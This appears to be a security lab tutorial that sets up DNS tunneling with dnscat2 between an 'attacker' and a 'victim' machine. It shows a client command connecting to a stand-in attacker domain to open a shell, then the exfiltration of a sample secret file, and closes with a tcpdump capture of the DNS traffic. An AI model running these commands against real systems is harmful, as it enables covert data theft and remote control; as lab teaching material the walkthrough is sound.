---
description: DNS Exfiltration
---

# Set up DNS Tunneling

## Set up Lab

### Attacker machine

#### Step1 : Install <mark style="color:$danger;">`dnscat2`</mark> Server on Attacker Machine

{% code expandable="true" %}
```shellscript
sudo apt update
sudo apt install ruby ruby-dev git build-essential -y
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
sudo bundle install
```
{% endcode %}

1. install ruby

{% code expandable="true" %}
```shellscript
sudo apt install ruby ruby-dev git build-essential -y
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-09-05 230711.png" alt=""><figcaption></figcaption></figure>

2. **Clone the dnscat2 repo**

{% code expandable="true" %}
```shellscript
git clone https://github.com/iagox86/dnscat2.git
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-09-05 231118.png" alt=""><figcaption></figcaption></figure>

3. **Install Bundler (Ruby dependency manager)**

{% code expandable="true" %}
```shellscript
cd dnscat2/server
sudo gem install bundler
```
{% endcode %}

<figure><img src="../../.gitbook/assets/kali-01.png" alt=""><figcaption></figcaption></figure>

4. **Install required Ruby gems**

{% code expandable="true" %}
```
sudo bundle install
```
{% endcode %}

<figure><img src="../../.gitbook/assets/kali-02.png" alt=""><figcaption></figcaption></figure>

5. start the DNS server

{% code expandable="true" %}
```shellscript
sudo ruby dnscat2.rb attcker.local
```
{% endcode %}

<figure><img src="../../.gitbook/assets/kali-03.png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
save secret string
{% endhint %}

### Target machine

#### step 2 : Install the <mark style="color:$primary;">`dnscat2`</mark> Client on the Victim

{% code expandable="true" %}
```shellscript
sudo apt update
sudo apt install git build-essential cmake -y
sudo apt install golang git
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
```
{% endcode %}

1. install Build tool

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

2. Install go and git

{% code expandable="true" %}
```shellscript
sudo apt install golang git
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-09-05 232739.png" alt=""><figcaption></figcaption></figure>

3. **Clone the dnscat2 repo**

{% code expandable="true" %}
```shellscript
git clone https://github.com/iagox86/dnscat2.git
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-09-05 233022.png" alt=""><figcaption></figcaption></figure>

4. **Compile the client**

{% code expandable="true" %}
```shellscript
cd dnscat2/client
make
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-09-05 233215.png" alt=""><figcaption></figcaption></figure>

3. use the dnscat2 client tool on the target machine

{% hint style="warning" icon="u-turn-down-left" %}
we had already started the dnscat2 server on the attacker machine
{% endhint %}

{% code expandable="true" %}
```shellscript
./dnscat --dns server=x.x.x.x,port=53,domain=attcker.local --secret=xxxxxxx
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2026-09-05 233524.png" alt=""><figcaption></figcaption></figure>

***

### Exfiltration

1. create a sample data in target machine&#x20;

{% code expandable="true" %}
```shellscript
echo "Confidential-Data-12345" > /tmp/secret.txt
```
{% endcode %}

2. set up shell

{% code expandable="true" %}
```
sessions
session -i 1
sell
Ctr+z
session -i 2 
whoami
```
{% endcode %}

{% code expandable="true" %}
```shellscript
download /tmp/secret.txt secret_exfil.txt
```
{% endcode %}

#### monitoring traffinc

{% code expandable="true" %}
```shellscript
sudo tcpdump -i any port 53 -w dns_traffic.pcap
```
{% endcode %}

